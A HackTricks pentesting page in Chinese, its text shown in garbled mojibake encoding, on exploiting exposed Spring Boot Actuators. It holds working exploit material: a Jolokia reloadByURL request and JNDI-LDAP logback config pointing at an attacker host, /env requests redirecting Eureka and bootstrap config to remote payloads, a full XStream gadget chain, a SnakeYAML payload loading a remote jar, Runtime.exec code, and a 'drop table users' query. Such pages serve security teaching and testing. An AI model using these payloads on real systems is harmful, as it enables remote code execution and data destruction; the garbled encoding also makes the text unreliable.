# Spring Actuators

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **Springèº«ä»½éªŒè¯ç»•è¿‡**

<figure><img src="../../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

**æ¥è‡ª** [**https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png**](https://raw.githubusercontent.com/Mike-n1/tips/main/SpringAuthBypass.png)\*\*\*\*

## åˆ©ç”¨Spring Boot Actuators

**æ‘˜è‡ª** [**https://www.veracode.com/blog/research/exploiting-spring-boot-actuators**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

Spring Bootæ¡†æ¶åŒ…å«ä¸€äº›ç§°ä¸ºactuatorsçš„åŠŸèƒ½ï¼Œç”¨äºåœ¨å°†Webåº”ç”¨ç¨‹åºæ¨é€åˆ°ç”Ÿäº§ç¯å¢ƒæ—¶å¸®åŠ©æ‚¨ç›‘è§†å’Œç®¡ç†å®ƒã€‚å®ƒä»¬æ—¨åœ¨ç”¨äºå®¡è®¡ã€å¥åº·çŠ¶å†µå’ŒæŒ‡æ ‡æ”¶é›†ï¼Œä½†åœ¨é…ç½®é”™è¯¯æ—¶ï¼Œå®ƒä»¬ä¹Ÿå¯èƒ½æ‰“å¼€ä¸€ä¸ªéšè—çš„æœåŠ¡å™¨å…¥å£ã€‚

å½“Spring Bootåº”ç”¨ç¨‹åºè¿è¡Œæ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨å°†å‡ ä¸ªç«¯ç‚¹ï¼ˆå¦‚'/health'ã€'/trace'ã€'/beans'ã€'/env'ç­‰ï¼‰æ³¨å†Œåˆ°è·¯ç”±è¿‡ç¨‹ä¸­ã€‚å¯¹äºSpring Boot 1-1.4ç‰ˆæœ¬ï¼Œå®ƒä»¬å¯ä»¥åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹è®¿é—®ï¼Œè¿™ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ä»Spring 1.5ç‰ˆæœ¬å¼€å§‹ï¼Œé™¤äº†'/health'å’Œ'/info'ä¹‹å¤–çš„æ‰€æœ‰ç«¯ç‚¹éƒ½è¢«è§†ä¸ºæ•æ„Ÿå¹¶é»˜è®¤å—åˆ°ä¿æŠ¤ï¼Œä½†è¿™ç§å®‰å…¨æ€§é€šå¸¸è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç¦ç”¨ã€‚

ä»¥ä¸‹Actuatorç«¯ç‚¹å¯èƒ½å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´å¯èƒ½çš„æ¼æ´ï¼š

* /dump - æ˜¾ç¤ºçº¿ç¨‹çš„è½¬å‚¨ï¼ˆåŒ…æ‹¬å †æ ˆè·Ÿè¸ªï¼‰
* /trace - æ˜¾ç¤ºæœ€è¿‘çš„å‡ ä¸ªHTTPæ¶ˆæ¯ï¼ˆå¯èƒ½åŒ…æ‹¬ä¼šè¯æ ‡è¯†ç¬¦ï¼‰
* /logfile - è¾“å‡ºæ—¥å¿—æ–‡ä»¶çš„å†…å®¹
* /shutdown - å…³é—­åº”ç”¨ç¨‹åº
* /mappings - æ˜¾ç¤ºæ‰€æœ‰MVCæ§åˆ¶å™¨æ˜ å°„
* /env - æä¾›å¯¹é…ç½®ç¯å¢ƒçš„è®¿é—®
* /actuator/env
* /restart - é‡æ–°å¯åŠ¨åº”ç”¨ç¨‹åº
* /heapdump - ä»æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä½¿ç”¨çš„JVMæ„å»ºå¹¶è¿”å›å †è½¬å‚¨

å¯¹äºSpring 1xï¼Œå®ƒä»¬æ³¨å†Œåœ¨æ ¹URLä¸‹ï¼Œè€Œå¯¹äº2xï¼Œå®ƒä»¬ç§»åŠ¨åˆ°"/actuator/"åŸºæœ¬è·¯å¾„ä¸‹ã€‚

**åˆ©ç”¨æ–¹æ³•ï¼š**

å¤§å¤šæ•°actuatorsä»…æ”¯æŒGETè¯·æ±‚ï¼Œå¹¶ç®€å•åœ°æ˜¾ç¤ºæ•æ„Ÿé…ç½®æ•°æ®ï¼Œä½†å…¶ä¸­å‡ ä¸ªå¯¹äºå¯»æ‰¾shellçš„äººç‰¹åˆ«æœ‰è¶£ï¼š

**1. é€šè¿‡'/jolokia'è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ**

å¦‚æœç›®æ ‡åº”ç”¨ç¨‹åºçš„ç±»è·¯å¾„ä¸­å­˜åœ¨Jolokiaåº“ï¼Œåˆ™Spring Bootä¼šè‡ªåŠ¨å°†å…¶æš´éœ²åœ¨'/jolokia' actuatorç«¯ç‚¹ä¸‹ã€‚Jolokiaå…è®¸é€šè¿‡HTTPè®¿é—®æ‰€æœ‰å·²æ³¨å†Œçš„MBeansï¼Œå¹¶è®¾è®¡ç”¨äºæ‰§è¡Œä¸JMXç›¸åŒçš„æ“ä½œã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹URLåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„MBeansæ“ä½œï¼š

[**http://127.0.0.1:8090/jolokia/list**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

åŒæ ·ï¼Œå¤§å¤šæ•°MBeansæ“ä½œåªæ˜¯æ˜¾ç¤ºä¸€äº›ç³»ç»Ÿæ•°æ®ï¼Œä½†æœ‰ä¸€ä¸ªç‰¹åˆ«æœ‰è¶£ï¼š

![reloadByURL](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_jolokia.png)

ç”±Logbackåº“æä¾›çš„'**reloadByURL**'æ“ä½œå…è®¸æˆ‘ä»¬ä»å¤–éƒ¨URLé‡æ–°åŠ è½½æ—¥å¿—é…ç½®ã€‚åªéœ€å¯¼èˆªåˆ°ï¼š[**http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml**](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¦å…³å¿ƒæ—¥å¿—é…ç½®å‘¢ï¼Ÿä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼š

1. é…ç½®å…·æœ‰XMLæ ¼å¼ï¼Œå½“ç„¶ï¼ŒLogbackå¯ç”¨äº†å¤–éƒ¨å®ä½“è§£æï¼Œå› æ­¤å®¹æ˜“å—åˆ°ç›²ç›®XXEçš„æ”»å‡»ã€‚
2. Logbacké…ç½®å…·æœ‰['ä»JNDIè·å–å˜é‡'](https://logback.qos.ch/manual/configuration.html#insertFromJNDI)çš„åŠŸèƒ½ã€‚åœ¨XMLæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŒ…å«ç±»ä¼¼'**\<insertFromJNDI env-entry-name="java:comp/env/appName" as="appName" />**'çš„æ ‡ç­¾ï¼Œnameå±æ€§å°†ä¼ é€’ç»™DirContext.lookup()æ–¹æ³•ã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥å‘.lookup()å‡½æ•°æä¾›ä»»æ„åç§°ï¼Œç”šè‡³ä¸éœ€è¦XXEæˆ–HeapDumpï¼Œå› ä¸ºå®ƒç»™äº†æˆ‘ä»¬å®Œå…¨çš„**è¿œç¨‹ä»£ç æ‰§è¡Œ**ã€‚

**å·¥ä½œåŸç†ï¼š**

1. æ”»å‡»è€…è¯·æ±‚ä¸Šè¿°URLä»¥æ‰§è¡Œ'reloadByURL'å‡½æ•°ï¼Œè¯¥å‡½æ•°ç”±'qos.logback.classic.jmx.JMXConfigurator'ç±»æä¾›ã€‚

2. 'reloadByURL'å‡½æ•°ä»[http://artsploit.com/logback.xml](http://artsploit.com/logback.xml)ä¸‹è½½æ–°çš„é…ç½®ï¼Œå¹¶å°†å…¶è§£æä¸ºLogbacké…ç½®ã€‚è¿™ä¸ªæ¶æ„é…ç½®åº”è¯¥å…·æœ‰ä»¥ä¸‹å†…å®¹ï¼š
```
<configuration>
<insertFromJNDI env-entry-name="ldap://artsploit.com:1389/jndi" as="appName" />
</configuration>
```
3\. å½“è¿™ä¸ªæ–‡ä»¶åœ¨å—æ¼æ´å½±å“çš„æœåŠ¡å™¨ä¸Šè§£ææ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªåˆ°æ”»å‡»è€…æ§åˆ¶çš„LDAPæœåŠ¡å™¨çš„è¿æ¥ï¼Œè¯¥è¿æ¥ç”±â€œenv-entry-nameâ€å‚æ•°å€¼æŒ‡å®šï¼Œä»è€Œå¯¼è‡´JNDIè§£æã€‚æ¶æ„çš„LDAPæœåŠ¡å™¨å¯èƒ½è¿”å›ä¸€ä¸ªå¸¦æœ‰â€œReferenceâ€ç±»å‹çš„å¯¹è±¡ï¼Œä»¥è§¦å‘ç›®æ ‡åº”ç”¨ç¨‹åºä¸Šæä¾›çš„å­—èŠ‚ç çš„æ‰§è¡Œã€‚JNDIæ”»å‡»åœ¨è¿™ç¯‡[MicroFocusç ”ç©¶è®ºæ–‡](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)ä¸­æœ‰å¾ˆå¥½çš„è§£é‡Šã€‚ä¹‹å‰åœ¨æˆ‘ä»¬çš„åšå®¢ä¸­æè¿°çš„[æ–°çš„JNDIåˆ©ç”¨æŠ€æœ¯](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)åœ¨è¿™é‡Œä¹Ÿé€‚ç”¨ï¼Œå› ä¸ºTomcatæ˜¯Spring Bootæ¡†æ¶çš„é»˜è®¤åº”ç”¨æœåŠ¡å™¨ã€‚

**2. é€šè¿‡'/env'è¿›è¡Œé…ç½®ä¿®æ”¹**

å¦‚æœSpring Cloud Librariesåœ¨ç±»è·¯å¾„ä¸­ï¼Œ**'/env'**ç«¯ç‚¹å…è®¸æ‚¨ä¿®æ”¹Springç¯å¢ƒå±æ€§ã€‚æ‰€æœ‰æ ‡è®°ä¸º'**@ConfigurationProperties**'çš„beanéƒ½å¯ä»¥è¢«ä¿®æ”¹å’Œé‡æ–°ç»‘å®šã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„è®¸å¤šå±æ€§éƒ½åˆ—åœ¨'/configprops'æ‰§è¡Œå™¨ç«¯ç‚¹ä¸Šã€‚å®é™…ä¸Šï¼Œæœ‰å¾ˆå¤šå±æ€§ï¼Œä½†æˆ‘ä»¬ä¸æ¸…æ¥šéœ€è¦ä¿®æ”¹ä»€ä¹ˆæ‰èƒ½å®ç°æŸäº›ç›®æ ‡ã€‚åœ¨èŠ±äº†å‡ å¤©æ—¶é—´ä¸å®ƒä»¬ç©è€åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†è¿™ä¸ªï¼š
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 65

eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream
```
è¯¥å±æ€§å¯ä»¥å°†Eureka serviceURLä¿®æ”¹ä¸ºä»»æ„å€¼ã€‚Eureka Serveré€šå¸¸ç”¨ä½œå‘ç°æœåŠ¡å™¨ï¼Œå‡ ä¹æ‰€æœ‰çš„Spring Cloudåº”ç”¨éƒ½ä¼šåœ¨å…¶ä¸Šæ³¨å†Œå¹¶å‘å…¶å‘é€çŠ¶æ€æ›´æ–°ã€‚å¦‚æœä½ å¾ˆå¹¸è¿åœ¨ç›®æ ‡ç±»è·¯å¾„ä¸­æœ‰Eureka-Client <1.8.7ï¼ˆå®ƒé€šå¸¸åŒ…å«åœ¨Spring Cloud Netflixä¸­ï¼‰ï¼Œä½ å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„**XStreamååºåˆ—åŒ–æ¼æ´**ã€‚ä½ åªéœ€è¦å°†'eureka.client.serviceUrl.defaultZone'å±æ€§è®¾ç½®ä¸ºä½ çš„æœåŠ¡å™¨URLï¼ˆ[http://artsploit.com/n/xstream](http://artsploit.com/n/xstream)ï¼‰ï¼Œé€šè¿‡'/env'è°ƒç”¨'/refresh'ç«¯ç‚¹ã€‚ä¹‹åï¼Œä½ çš„æœåŠ¡å™¨åº”è¯¥æä¾›ä»¥ä¸‹å†…å®¹çš„XStreamè´Ÿè½½ï¼š
```markup
<linked-hash-set>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>
<string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>
</command>
<redirectErrorStream>false</redirectErrorStream>
</next>
</iter>
<filter class="javax.imageio.ImageIO$ContainsFilter">
<method>
<class>java.lang.ProcessBuilder</class>
<name>start</name>
<parameter-types/>
</method>
<name>foo</name>
</filter>
<next class="string">foo</next>
</serviceIterator>
<lock/>
</cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer>
</is>
</dataSource>
</dataHandler>
</value>
</jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```
è¿™ä¸ªXStreamè´Ÿè½½æ˜¯ä»[Marshalsecç ”ç©¶](https://github.com/mbechler/marshalsec)ä¸­çš„ImageIO JDK-only gadgeté“¾ç¨ä½œä¿®æ”¹å¾—åˆ°çš„ã€‚å”¯ä¸€çš„åŒºåˆ«æ˜¯ä½¿ç”¨**LinkedHashSet**æ¥è§¦å‘'jdk.nashorn.internal.objects.NativeString.hashCode()'æ–¹æ³•ã€‚åŸå§‹è´Ÿè½½åˆ©ç”¨java.lang.Mapæ¥å®ç°ç›¸åŒçš„è¡Œä¸ºï¼Œä½†æ˜¯Eurekaçš„XStreamé…ç½®æœ‰ä¸€ä¸ª[è‡ªå®šä¹‰çš„æ˜ å°„è½¬æ¢å™¨](https://github.com/Netflix/eureka/blob/master/eureka-client/src/main/java/com/netflix/discovery/converters/XmlXStream.java#L58)ï¼Œä½¿å…¶æ— æ³•ä½¿ç”¨ã€‚ä¸Šé¢çš„è´Ÿè½½æ ¹æœ¬ä¸ä½¿ç”¨æ˜ å°„ï¼Œå¯ä»¥ç”¨æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œè€Œä¸éœ€è¦é¢å¤–çš„é™åˆ¶ã€‚

ä½¿ç”¨Spring Actuatorsï¼Œå³ä½¿æ‚¨æ²¡æœ‰è®¿é—®å†…éƒ¨EurekaæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ï¼›æ‚¨åªéœ€è¦ä¸€ä¸ªå¯ç”¨çš„"/env"ç«¯ç‚¹ã€‚

**å…¶ä»–æœ‰ç”¨çš„è®¾ç½®:**

**spring.datasource.tomcat.validationQuery=drop+table+users** - å…è®¸æ‚¨æŒ‡å®šä»»ä½•SQLæŸ¥è¯¢ï¼Œå¹¶å°†è‡ªåŠ¨æ‰§è¡Œè¯¥æŸ¥è¯¢å¯¹å½“å‰æ•°æ®åº“çš„å½±å“ã€‚å®ƒå¯ä»¥æ˜¯ä»»ä½•è¯­å¥ï¼ŒåŒ…æ‹¬æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤ã€‚

![Exploiting Spring Boot Actuators Drop Table](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_drop\_table.png)

**spring.datasource.tomcat.url**=jdbc:hsqldb:[https://localhost:3002/xdb](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - å…è®¸æ‚¨ä¿®æ”¹å½“å‰çš„JDBCè¿æ¥å­—ç¬¦ä¸²ã€‚

æœ€åä¸€ä¸ªçœ‹èµ·æ¥å¾ˆå¥½ï¼Œä½†é—®é¢˜æ˜¯å½“è¿è¡Œæ•°æ®åº“è¿æ¥çš„åº”ç”¨ç¨‹åºå·²ç»å»ºç«‹æ—¶ï¼Œä»…æ›´æ–°JDBCå­—ç¬¦ä¸²æ²¡æœ‰ä»»ä½•æ•ˆæœã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯èƒ½æœ‰å¦ä¸€ä¸ªå±æ€§å¯ä»¥å¸®åŠ©æˆ‘ä»¬ï¼š

**spring.datasource.tomcat.max-active**=777

æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œä½¿ç”¨çš„æŠ€å·§æ˜¯å¢åŠ ä¸æ•°æ®åº“çš„å¹¶å‘è¿æ¥æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹JDBCè¿æ¥å­—ç¬¦ä¸²ï¼Œå¢åŠ è¿æ¥æ•°ï¼Œç„¶åå‘åº”ç”¨ç¨‹åºå‘é€è®¸å¤šè¯·æ±‚ä»¥æ¨¡æ‹Ÿé‡è´Ÿè½½ã€‚åœ¨è´Ÿè½½ä¸‹ï¼Œåº”ç”¨ç¨‹åºå°†ä½¿ç”¨æ›´æ–°åçš„æ¶æ„JDBCå­—ç¬¦ä¸²åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“è¿æ¥ã€‚æˆ‘åœ¨æœ¬åœ°å¯¹Mysqlè¿›è¡Œäº†æµ‹è¯•ï¼Œæ•ˆæœéå¸¸å¥½ã€‚

![Exploiting Spring Boot Actuators Max Active](https://www.veracode.com/sites/default/files/exploiting\_spring\_boot\_actuators\_max\_active.png)

é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å…¶ä»–çœ‹èµ·æ¥æœ‰è¶£çš„å±æ€§ï¼Œä½†å®é™…ä¸Šå¹¶ä¸çœŸæ­£æœ‰ç”¨ï¼š

**spring.datasource.url** - æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼ˆä»…ç”¨äºç¬¬ä¸€ä¸ªè¿æ¥ï¼‰

**spring.datasource.jndiName** - æ•°æ®åº“JNDIå­—ç¬¦ä¸²ï¼ˆä»…ç”¨äºç¬¬ä¸€ä¸ªè¿æ¥ï¼‰

**spring.datasource.tomcat.dataSourceJNDI** - æ•°æ®åº“JNDIå­—ç¬¦ä¸²ï¼ˆæ ¹æœ¬ä¸ä½¿ç”¨ï¼‰

**spring.cloud.config.uri**=[http://artsploit.com/](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators) - spring cloud config urlï¼ˆåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨åæ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œåªä½¿ç”¨åˆå§‹å€¼ï¼‰

é™¤éè°ƒç”¨'/restart'ç«¯ç‚¹ï¼Œå¦åˆ™è¿™äº›å±æ€§éƒ½æ²¡æœ‰ä»»ä½•æ•ˆæœã€‚æ­¤ç«¯ç‚¹ä¼šé‡æ–°å¯åŠ¨æ‰€æœ‰ApplicationContextï¼Œä½†é»˜è®¤æƒ…å†µä¸‹å·²ç¦ç”¨ã€‚

è¿˜æœ‰å¾ˆå¤šå…¶ä»–æœ‰è¶£çš„å±æ€§ï¼Œä½†å¤§å¤šæ•°åœ¨æ›´æ”¹åä¸ä¼šç«‹å³ç”Ÿæ•ˆã€‚

**æ³¨æ„**ï¼šåœ¨Spring Boot 2xä¸­ï¼Œé€šè¿‡'/env'ç«¯ç‚¹ä¿®æ”¹å±æ€§çš„è¯·æ±‚æ ¼å¼ç•¥æœ‰ä¸åŒï¼ˆä½¿ç”¨jsonæ ¼å¼ï¼‰ï¼Œä½†æ€è·¯æ˜¯ç›¸åŒçš„ã€‚

**ä¸€ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºç¤ºä¾‹:**

å¦‚æœæ‚¨æƒ³åœ¨æœ¬åœ°æµ‹è¯•æ­¤æ¼æ´ï¼Œæˆ‘åœ¨æˆ‘çš„Githubé¡µé¢ä¸Šåˆ›å»ºäº†ä¸€ä¸ª[ç®€å•çš„Spring Bootåº”ç”¨ç¨‹åº](https://github.com/artsploit/actuator-testbed)ã€‚æ‰€æœ‰çš„è´Ÿè½½éƒ½åº”è¯¥åœ¨é‚£é‡Œå·¥ä½œï¼Œé™¤äº†æ•°æ®åº“è®¾ç½®ï¼ˆé™¤éæ‚¨è¿›è¡Œé…ç½®ï¼‰ã€‚

**é»‘ç›’å‘ç°:**

å®Œæ•´çš„é»˜è®¤Actuatorsåˆ—è¡¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ï¼š[https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt](https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)ã€‚è¯·è®°ä½ï¼Œåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨@Endpointæ³¨è§£åˆ›å»ºè‡ªå·±çš„ç«¯ç‚¹ã€‚

**æ›´æ–°äº2019å¹´5æœˆ:**

æœ‰ä¸€ç§æ›´å¯é çš„æ–¹æ³•å¯ä»¥é€šè¿‡Springç¯å¢ƒå±æ€§ä¿®æ”¹å®ç°RCE:
```
POST /env HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml
```
è¿™ä¸ªè¯·æ±‚ä¿®æ”¹äº†'spring.cloud.bootstrap.location'å±æ€§ï¼Œè¯¥å±æ€§ç”¨äºåŠ è½½å¤–éƒ¨é…ç½®å¹¶ä»¥YAMLæ ¼å¼è§£æã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è°ƒç”¨'/refresh'ç«¯ç‚¹ã€‚
```
POST /refresh HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
å½“ä»è¿œç¨‹æœåŠ¡å™¨è·å–YAMLé…ç½®æ—¶ï¼Œå®ƒä¼šä½¿ç”¨SnakeYAMLåº“è¿›è¡Œè§£æï¼Œè¯¥åº“ä¹Ÿå®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»çš„å½±å“ã€‚æœ‰æ•ˆè½½è·ï¼ˆyaml-payload.ymlï¼‰å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸Šè¿°çš„Marshalsecç ”ç©¶ç”Ÿæˆï¼š
```
!!javax.script.ScriptEngineManager [
!!java.net.URLClassLoader [[
!!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
]]
]
```
ååºåˆ—åŒ–è¯¥æ–‡ä»¶ä¼šè§¦å‘ä½¿ç”¨æä¾›çš„URLClassLoaderæ‰§è¡ŒScriptEngineManagerçš„æ„é€ å‡½æ•°ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒä¼šå¯¼è‡´è°ƒç”¨**'java.util.ServiceLoader#load(java.lang.Class\<S>, java.lang.ClassLoader)'**æ–¹æ³•ï¼Œåœ¨ç±»è·¯å¾„ä¸­çš„æ‰€æœ‰åº“ä¸­æŸ¥æ‰¾'ScriptEngineFactory'æ¥å£çš„æ‰€æœ‰å®ç°ã€‚ç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡URLClassLoaderæ·»åŠ æ–°çš„åº“ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æä¾›ä¸€ä¸ªåŒ…å«æ¶æ„å­—èŠ‚ç çš„æ–°çš„'ScriptEngineFactory'ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹å¿…éœ€æ–‡ä»¶çš„jarå½’æ¡£æ–‡ä»¶ï¼š[yaml-payload.jar:/artsploit/AwesomeScriptEngineFactory.class](https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java)åº”åŒ…å«å®é™…çš„å­—èŠ‚ç ï¼Œå…¶ä¸­æ„é€ å‡½æ•°ä¸­åŒ…å«æ¶æ„è½½è·ã€‚
```
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

public AwesomeScriptEngineFactory() {
try {
Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
} catch (IOException e) {
e.printStackTrace();
}
}
```
[yaml-payload.jar:/META-INF/services/javax.script.ScriptEngineFactory](https://github.com/artsploit/yaml-payload/blob/master/src/META-INF/services/javax.script.ScriptEngineFactory)åº”è¯¥åªæ˜¯ä¸€ä¸ªåŒ…å«å¯¹'artsploit.AwesomeScriptEngineFactory'çš„å®Œæ•´å¼•ç”¨çš„æ–‡æœ¬æ–‡ä»¶ï¼Œè¿™æ ·ServiceLoaderå°±ä¼šçŸ¥é“åœ¨å“ªé‡Œæ‰¾åˆ°è¯¥ç±»ï¼š**artsploit.AwesomeScriptEngineFactory**ã€‚å†æ¬¡å¼ºè°ƒï¼Œè¿™ç§åˆ©ç”¨æŠ€æœ¯éœ€è¦åœ¨ç±»è·¯å¾„ä¸­å­˜åœ¨spring cloudï¼Œä½†ä¸Eurekaçš„XStream payloadç›¸æ¯”ï¼Œå®ƒç”šè‡³åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­ä¹Ÿå¯ä»¥å·¥ä½œã€‚æ‚¨å¯ä»¥åœ¨æˆ‘çš„githubé¡¹ç›®ä¸­æ‰¾åˆ°å®Œæ•´çš„payloadï¼š[yaml-payload](https://github.com/artsploit/yaml-payload)ã€‚

## Env + H2 RCE

è¯·å‚é˜…æ­¤é¡µé¢ä»¥äº†è§£å¦‚ä½•åˆ©ç”¨/env + H2ç»„åˆï¼š[https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database)

## æ›´å¤šä¿¡æ¯

* [https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html](https://tutorialboy24.blogspot.com/2022/02/introduction-to-spring-boot-related.html)
* [https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators](https://blog.maass.xyz/spring-actuator-security-part-1-stealing-secrets-using-spring-actuators)
* [https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep](https://blog.maass.xyz/spring-actuator-security-part-2-finding-actuators-using-static-code-analysis-with-semgrep)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

